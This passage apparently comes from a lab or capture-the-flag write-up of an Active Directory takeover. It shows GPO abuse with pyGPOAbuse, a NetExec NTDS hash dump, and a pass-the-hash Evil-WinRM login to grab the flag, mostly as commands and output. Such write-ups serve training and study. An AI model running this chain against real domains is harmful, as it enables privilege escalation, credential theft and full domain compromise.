The attacker will move this file to the BloodHound server and begin identifying attack paths. Of which `bbarkinson` has GenericWrite on Finance Policy. This can be abused with [pygpoabuse](https://github.com/Hackndo/pyGPOAbuse).

![BloodHound Attack Path](./screenshots/bloodhoundpath.png)

This will modify the GPO to add a scheduled task that makes `bbarkinson` an Administrator.
```zsh
➜ python3 ~/tools/pyGPOAbuse/pygpoabuse.py -user 'HSM.LOCAL/bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -dc-ip 10.1.88.121 -gpo-id '526CDF3A-10B6-4B00-BCFA-36E59DCD71A2' -command "net localgroup Administrators IMCOMINGFORYOU$ /add" -f
SUCCESS:root:ScheduledTask TASK_fb59e805 created!
[+] ScheduledTask TASK_fb59e805 created!

# I had to reset the box at this point, secretsdump also did not work, presumably because of the replication issues.

➜ nxc smb DC01 -u 'test$' -p 'Password123!' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         10.1.141.202    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:False) 
SMB         10.1.141.202    445    DC01             [+] hsm.local\backup$:password123 (Pwn3d!)
SMB         10.1.141.202    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.141.202    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:20f4d4038a64f83862c865c3d5ea2629:::
SMB         10.1.141.202    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.141.202    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c86de0837cb9465b74c1924cf0695422:::
SMB         10.1.141.202    445    DC01             lab.local\bbarkinson:1103:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc:::
SMB         10.1.141.202    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f3065aeb7f50b35e5fb2e978c2bc98fe:::
SMB         10.1.141.202    445    DC01             EC2AMAZ-NS87CNK$:1107:aad3b435b51404eeaad3b435b51404ee:1e302b379419b9ba2be349993f021d85:::
SMB         10.1.141.202    445    DC01             test$:2601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Finally with the Administrator hash in hand, the attacker connects and retrieves the final flag, fully compromising the Active Directory environment.
```bash
✘ evil-winrm -i dc01 -u Administrator -H '20f4d4038a64f83862c865c3d5ea2629' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/14/2024   1:03 AM            470 EC2 Feedback.url
-a----        11/14/2024   1:03 AM            501 EC2 Microsoft Windows Guide.url
-a----        11/18/2025   6:58 PM           2355 Microsoft Edge.lnk
-a----        11/19/2025   1:45 PM            124 root.txt
```